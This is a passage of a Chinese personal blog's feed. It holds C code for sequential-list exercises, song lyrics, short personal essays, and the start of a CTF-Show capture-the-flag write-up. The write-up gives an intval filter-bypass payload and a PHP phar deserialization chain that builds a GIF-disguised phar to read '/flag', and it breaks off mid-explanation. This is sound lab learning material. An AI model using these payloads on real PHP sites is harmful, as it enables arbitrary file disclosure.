class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[N];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(sqlist *L)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,t;</span><br><span class="line">    i = <span class="number">0</span>;<span class="comment">// 第一个元素位置</span></span><br><span class="line">    j = L-&gt;length - <span class="number">1</span>; <span class="comment">// 最后一个元素位置</span></span><br><span class="line">    <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">        t = L-&gt;data[i]; <span class="comment">// 将第一个元素存入 临时的 t 中 </span></span><br><span class="line">        L-&gt;data[i++] = L-&gt;data[j]; <span class="comment">// 把最后一个元素值赋给第一个元素的位置</span></span><br><span class="line">        L-&gt;data[j--] = t; <span class="comment">// 再把 存入 t 的第一个元素的值赋给</span></span><br><span class="line"><span class="comment">// 注意：j-- 的意思：首先进行赋值然后再进行自减</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    sqlist <span class="built_in">list</span> = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>&#125;,<span class="number">10</span>&#125;;</span><br><span class="line">    reverse(&amp;<span class="built_in">list</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">list</span>.length;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">list</span>.data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/15/nMp3fvKexAsPEZS.png" alt="image-20210915205210790"></p><h4 id="3-已知一个顺序表中的各结点值是从小到大有序的，设计一个算法，插入一个值为x的结点，使顺序表中的结点仍然是从小到大有序。"><a href="#3-已知一个顺序表中的各结点值是从小到大有序的，设计一个算法，插入一个值为x的结点，使顺序表中的结点仍然是从小到大有序。" class="headerlink" title="3.已知一个顺序表中的各结点值是从小到大有序的，设计一个算法，插入一个值为x的结点，使顺序表中的结点仍然是从小到大有序。"></a>3.已知一个顺序表中的各结点值是从小到大有序的，设计一个算法，插入一个值为x的结点，使顺序表中的结点仍然是从小到大有序。</h4><p><strong>算法：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[N];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(sqlist *L,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;length &lt; N)&#123;   <span class="comment">//确保顺序表不满，能够进行插入数据</span></span><br><span class="line">        i = L-&gt;length - <span class="number">1</span>; <span class="comment">// i 是最后一个元素位置</span></span><br><span class="line"><span class="keyword">while</span>(i &gt;= <span class="number">0</span> &amp;&amp; L-&gt;data[i] &gt; x)&#123; <span class="comment">// 确保 x 小于已给位置，便于将 x 插入到其前面</span></span><br><span class="line">            L-&gt;data[i+<span class="number">1</span>] = L-&gt;data[i];</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        L-&gt;data[i+<span class="number">1</span>] = x;<span class="comment">// 插入 x </span></span><br><span class="line">        L-&gt;length++;<span class="comment">// 顺序表长度加 1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data[N];</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(sqlist *L,datatype x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;length &lt; N)&#123;   <span class="comment">//确保顺序表不满，能够进行插入数据</span></span><br><span class="line">        i = L-&gt;length - <span class="number">1</span>; <span class="comment">// i 是最后一个元素位置</span></span><br><span class="line"><span class="keyword">while</span>(i &gt;= <span class="number">0</span> &amp;&amp; L-&gt;data[i] &gt; x)&#123; <span class="comment">// 确保 x 小于已给位置，便于将 x 插入到其前面</span></span><br><span class="line">            L-&gt;data[i+<span class="number">1</span>] = L-&gt;data[i];</span><br><span class="line">            i--;</span><br><span class="line">        &#125;</span><br><span class="line">        L-&gt;data[i+<span class="number">1</span>] = x;<span class="comment">// 插入 x </span></span><br><span class="line">        L-&gt;length++;<span class="comment">// 顺序表长度加 1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    sqlist <span class="built_in">list</span> = &#123;&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">22</span>,<span class="number">44</span>,<span class="number">89</span>,<span class="number">122</span>,<span class="number">243</span>,<span class="number">534</span>&#125;,<span class="number">10</span>&#125;;</span><br><span class="line">    insert(&amp;<span class="built_in">list</span>,<span class="number">350</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">list</span>.length;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">list</span>.data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/15/DHxBpZmaULCcFMS.png" alt="image-20210915211017268"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;顺序表&quot;&gt;&lt;a href=&quot;#顺序表&quot; class=&quot;headerlink&quot; title=&quot;顺序表&quot;&gt;&lt;/a&gt;顺序表&lt;/h3&gt;&lt;p&gt;插入 删除 任意位置，特点：顺序存储&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;t</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="顺序表" scheme="https://xizhi-future.github.io/tags/%E9%A1%BA%E5%BA%8F%E8%A1%A8/"/>
    
    <category term="线性存储" scheme="https://xizhi-future.github.io/tags/%E7%BA%BF%E6%80%A7%E5%AD%98%E5%82%A8/"/>
    
  </entry>
  
  <entry>
    <title>世间美好与你环环相扣</title>
    <link href="https://xizhi-future.github.io/2021/10/01/%E4%B8%96%E9%97%B4%E7%BE%8E%E5%A5%BD%E4%B8%8E%E4%BD%A0%E7%8E%AF%E7%8E%AF%E7%9B%B8%E6%89%A3/"/>
    <id>https://xizhi-future.github.io/2021/10/01/%E4%B8%96%E9%97%B4%E7%BE%8E%E5%A5%BD%E4%B8%8E%E4%BD%A0%E7%8E%AF%E7%8E%AF%E7%9B%B8%E6%89%A3/</id>
    <published>2021-10-01T11:42:25.000Z</published>
    <updated>2021-10-01T11:43:15.379Z</updated>
    
    <content type="html"><![CDATA[<h3 id="世间美好与你环环相扣"><a href="#世间美好与你环环相扣" class="headerlink" title="世间美好与你环环相扣"></a>世间美好与你环环相扣</h3><p>偏偏秉烛夜游</p><p>午夜星辰 似奔走之友</p><p>爱你每个结痂伤口</p><p>酿成的陈年烈酒</p><p>入喉尚算可口</p><p>怎么泪水 还偶尔失守</p><p>邀你细看心中缺口</p><p>裂缝中留存 温柔</p><p>此时已莺飞草长 爱的人正在路上</p><p>我知他风雨兼程 途经日暮不赏</p><p>穿越人海 只为与你相拥</p><p>此刻已皓月当空 爱的人手捧星光</p><p>我知他乘风破浪 去了黑暗一趟</p><p>感同身受 给你救赎热 望</p><p>知道你不能 还要你感受</p><p>让星光加了一点彩虹</p><p>让樱花偷偷 吻你额头</p><p>让世间美好 与你环环相扣</p><p>此时已莺飞草长 爱的人正在路上</p><p>我知他风雨兼程 途经日暮不赏</p><p>穿越人海 只为与你相拥</p><p>此刻已皓月当空 爱的人手捧星光</p><p>我知他乘风破浪 去了黑暗一趟</p><p>感同身受 给你救赎热 望</p><p>此时已莺飞草长 爱的人正在路上</p><p>我知他风雨兼程 途经日暮不赏</p><p>穿越人海 只为与你相拥</p><p>此刻已皓月当空 爱的人手捧星光</p><p>我知他乘风破浪 去了黑暗一趟</p><p>感同身受 给你救赎热 望</p><p>知道你不能 还要你感受</p><p>让星光加了一点彩虹</p><p>当樱花开的纷纷扬扬</p><p>当世间美好 与你环环相扣</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;世间美好与你环环相扣&quot;&gt;&lt;a href=&quot;#世间美好与你环环相扣&quot; class=&quot;headerlink&quot; title=&quot;世间美好与你环环相扣&quot;&gt;&lt;/a&gt;世间美好与你环环相扣&lt;/h3&gt;&lt;p&gt;偏偏秉烛夜游&lt;/p&gt;
&lt;p&gt;午夜星辰 似奔走之友&lt;/p&gt;
&lt;p&gt;爱你每个结痂</summary>
      
    
    
    
    <category term="音乐分享" scheme="https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>唯愿我们</title>
    <link href="https://xizhi-future.github.io/2021/10/01/%E5%94%AF%E6%84%BF%E6%88%91%E4%BB%AC/"/>
    <id>https://xizhi-future.github.io/2021/10/01/%E5%94%AF%E6%84%BF%E6%88%91%E4%BB%AC/</id>
    <published>2021-10-01T11:40:26.000Z</published>
    <updated>2021-10-01T11:41:42.683Z</updated>
    
    <content type="html"><![CDATA[<h3 id="唯愿我们"><a href="#唯愿我们" class="headerlink" title="唯愿我们"></a>唯愿我们</h3><p>从鲜衣怒马到鬓染白发 </p><p>不过弹指一刹那； </p><p>从小桥人家到沧海无涯</p><p>匆匆一眼尽繁华。 </p><p>流年似水， 往事不可追； </p><p>光阴似箭， 物是人已非。 </p><p>让烦恼缠绕心尖， 生活一片颓然； </p><p>让痛苦徘徊耳边， 人生全是不满。</p><p>感情的遗憾， 不如放手随他。 </p><p>想送你回家的人， </p><p>东西南北都顺路； </p><p>想陪你吃饭的人， </p><p>酸甜苦辣都可口；</p><p>想见你一面的人，</p><p>隔山隔海都能来。</p><p>生活的刁难， 不如看淡放宽。</p><p>生命这一程， 交织着风霜雨雪；</p><p>人生这一段， 夹杂着泥泞坎坷。 </p><p>没有跨不过的河， </p><p>没有迈不过的坎。</p><p>内心的执迷， 不如随风飘散。</p><p>有一往无前， 就有知难而退。 </p><p>看透了， 便是过眼云烟； </p><p>想通了， 不过昙花一现。 </p><p>不念过去， 不畏将来， </p><p>你若不放心上， 岁月便会无恙。</p><p>边走边看， 是一种优雅；</p><p>边走边忘， 是一份豁达。 </p><p>敬往事一杯酒， 愿岁月不回头。 </p><p><strong>唯愿我们：</strong></p><p>  <strong>过去的， 别再遗憾；</strong><br>  <strong>未来的， 无须忧虑；</strong><br>  <strong>现在的， 加倍珍惜。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;唯愿我们&quot;&gt;&lt;a href=&quot;#唯愿我们&quot; class=&quot;headerlink&quot; title=&quot;唯愿我们&quot;&gt;&lt;/a&gt;唯愿我们&lt;/h3&gt;&lt;p&gt;从鲜衣怒马到鬓染白发 &lt;/p&gt;
&lt;p&gt;不过弹指一刹那； &lt;/p&gt;
&lt;p&gt;从小桥人家到沧海无涯&lt;/p&gt;
&lt;p&gt;匆匆一眼尽繁华。</summary>
      
    
    
    
    <category term="生活杂谈" scheme="https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>难熬的一夜</title>
    <link href="https://xizhi-future.github.io/2021/10/01/%E9%9A%BE%E7%86%AC%E7%9A%84%E4%B8%80%E5%A4%9C/"/>
    <id>https://xizhi-future.github.io/2021/10/01/%E9%9A%BE%E7%86%AC%E7%9A%84%E4%B8%80%E5%A4%9C/</id>
    <published>2021-10-01T11:38:19.000Z</published>
    <updated>2021-10-01T11:39:46.754Z</updated>
    
    <content type="html"><![CDATA[<p>难以想象，现在是8月27日5：56，我现在正躺在床上，写着这篇感想。</p><p>这个时间，对于我来说，怎么可能，不在睡觉，可事实是，什么鬼，我简直不敢相信，我入戏就</p><p>这么深吗，从前根本没有这样过，整整一个晚上，我满脑子都是剧情，可怕的剧情。夜里，好多</p><p>次清醒着，却又不敢睁眼，生怕一睁眼，就会有那张脸出现在我的眼前。要么就是满脑子的男主</p><p>女主，我对男主的经历感到很难过，并不是他的错啊，他也很痛苦啊，可是为什么要让他来承受</p><p>这一切。哎，总之，我很伤心，更为之心痛。</p><p>天色渐渐明朗，我听见了下面阿姨的扫地声，突然就不觉着害怕了，因为，这个世界很美好的不</p><p>是吗？你自己不也说过，这个世界，远比你想象的更加美好！太阳总会升起，世界总会迎来光</p><p>明。</p><p>就当是在给自己壮胆吧，世界的黑暗也总得有人知道，它在帮助我们变得更加勇敢。</p><p>2021.8.27    6：12</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;难以想象，现在是8月27日5：56，我现在正躺在床上，写着这篇感想。&lt;/p&gt;
&lt;p&gt;这个时间，对于我来说，怎么可能，不在睡觉，可事实是，什么鬼，我简直不敢相信，我入戏就&lt;/p&gt;
&lt;p&gt;这么深吗，从前根本没有这样过，整整一个晚上，我满脑子都是剧情，可怕的剧情。夜里，好多&lt;/p</summary>
      
    
    
    
    <category term="生活杂谈" scheme="https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>查无此人</title>
    <link href="https://xizhi-future.github.io/2021/10/01/%E6%9F%A5%E6%97%A0%E6%AD%A4%E4%BA%BA/"/>
    <id>https://xizhi-future.github.io/2021/10/01/%E6%9F%A5%E6%97%A0%E6%AD%A4%E4%BA%BA/</id>
    <published>2021-10-01T11:36:26.000Z</published>
    <updated>2021-10-01T11:51:12.530Z</updated>
    
    <content type="html"><![CDATA[<p>村上春树说</p><p>“你要记得那些黑暗中默默抱紧你的人，逗你笑的人，陪你彻夜聊天的人，坐车来看望你的人，带</p><p>着你四处游荡的人，说想念你的人。是这些人组成你生命中一点一滴的温暖，是这些温暖使你成</p><p>为善良的人。”</p><p>然后，在评论中我看到了，<br>，<br>，<br>查无此人。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;村上春树说&lt;/p&gt;
&lt;p&gt;“你要记得那些黑暗中默默抱紧你的人，逗你笑的人，陪你彻夜聊天的人，坐车来看望你的人，带&lt;/p&gt;
&lt;p&gt;着你四处游荡的人，说想念你的人。是这些人组成你生命中一点一滴的温暖，是这些温暖使你成&lt;/p&gt;
&lt;p&gt;为善良的人。”&lt;/p&gt;
&lt;p&gt;然后，在评论中我</summary>
      
    
    
    
    <category term="生活杂谈" scheme="https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>胡适与江冬秀</title>
    <link href="https://xizhi-future.github.io/2021/10/01/%E8%83%A1%E9%80%82%E4%B8%8E%E6%B1%9F%E5%86%AC%E7%A7%80/"/>
    <id>https://xizhi-future.github.io/2021/10/01/%E8%83%A1%E9%80%82%E4%B8%8E%E6%B1%9F%E5%86%AC%E7%A7%80/</id>
    <published>2021-10-01T11:34:34.000Z</published>
    <updated>2021-10-01T11:35:33.614Z</updated>
    
    <content type="html"><![CDATA[<p>她并非小肚鸡肠，她能容忍胡适的风花雪月，但她就是不愿意原谅，曾经那么信任的两个人，嘴</p><p>上说着表哥表妹，背地里却狠狠背叛了她。</p><p>张爱玲说：”他们（胡适和江冬秀）是旧式婚姻罕有的幸福例子。”</p><p>她看多了旧式婚姻之中女人的悲剧，她绝对不能做怨妇，不能被丈夫牵着鼻子走，而是让胡适在</p><p>生活中依赖她，在心中敬重她，在感情上不能轻易放弃她。</p><p>胡适和江冬秀弯弯绕绕，终于走向白头功德圆满，他从刚开始的衡量算计，委屈求全，到真正为</p><p>江冬秀折服。世人笑他一位西装客娶了小脚女，哪知在江冬秀的人生哲理前，胡适的那些小聪明</p><p>真的就不算什么事儿了。</p><p>思君不见，倍感思君；别离难忍，忍痛别离。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;她并非小肚鸡肠，她能容忍胡适的风花雪月，但她就是不愿意原谅，曾经那么信任的两个人，嘴&lt;/p&gt;
&lt;p&gt;上说着表哥表妹，背地里却狠狠背叛了她。&lt;/p&gt;
&lt;p&gt;张爱玲说：”他们（胡适和江冬秀）是旧式婚姻罕有的幸福例子。”&lt;/p&gt;
&lt;p&gt;她看多了旧式婚姻之中女人的悲剧，她绝对不能做</summary>
      
    
    
    
    <category term="生活杂谈" scheme="https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF-Show-吃瓜杯</title>
    <link href="https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/"/>
    <id>https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/</id>
    <published>2021-10-01T11:19:34.000Z</published>
    <updated>2021-10-01T11:20:18.220Z</updated>
    
    <content type="html"><![CDATA[<p>CTF Show 吃瓜杯篇。</p><span id="more"></span><h1 id="CTF-Show-吃瓜杯"><a href="#CTF-Show-吃瓜杯" class="headerlink" title="CTF Show 吃瓜杯"></a>CTF Show 吃瓜杯</h1><h2 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==4476)&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,0)===4476)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=%20010574</span><br><span class="line">?num=%0c010574</span><br><span class="line">?num=%0a010574</span><br></pre></td></tr></table></figure><h2 id="ATTup"><a href="#ATTup" class="headerlink" title="ATTup"></a>ATTup</h2><p>zip 文件上传 + 文件包含 file_get_contents —&gt; <a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">phar 反序列化</a></p><p>文件内容过滤  &lt;?   php ，过滤 <code>&lt;?</code> ，无法正常解析为 php 代码</p><p>上传成功发现：序列化与反序列化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class View &#123;</span><br><span class="line">    public <span class="variable">$fn</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$this</span>-&gt;fn));</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$text</span>.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public <span class="variable">$fun</span> = <span class="string">&quot;:)&quot;</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="variable">$fuc</span> = <span class="variable">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$fuc</span>();</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Just a fun &quot;</span>.<span class="variable">$this</span>-&gt;fun.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$stat</span> = @<span class="built_in">stat</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发 echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br></pre></td></tr></table></figure><p><strong>生成 .phar 文件：</strong></p><p>我们的目的是成功创建 View 对象然后成功调用 __invoke() 方法，利用 file_get_contents 来读取到文件中的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class View&#123;</span><br><span class="line">    public <span class="variable">$fn</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$this</span>-&gt;fn));</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$text</span>.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Fun&#123;</span><br><span class="line">    public <span class="variable">$fun</span>=<span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="variable">$fuc</span> = <span class="variable">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$fuc</span>();</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Just a fun &quot;</span>.<span class="variable">$this</span>-&gt;fun.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&#x27;123.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&amp;lt;?= __HALT_COMPILER(); ?&amp;gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = new Fun();</span><br><span class="line"><span class="variable">$b</span>-&gt;fun= new Fun();</span><br><span class="line"><span class="variable">$b</span>-&gt;fun-&gt;fun=new View(); <span class="comment"># 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用</span></span><br><span class="line"><span class="variable">$b</span>-&gt;fun-&gt;fun-&gt;fn=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><ul><li><code>&lt;?</code> 过滤，使用 实体html 编码代替 ，<code>&amp;lt;    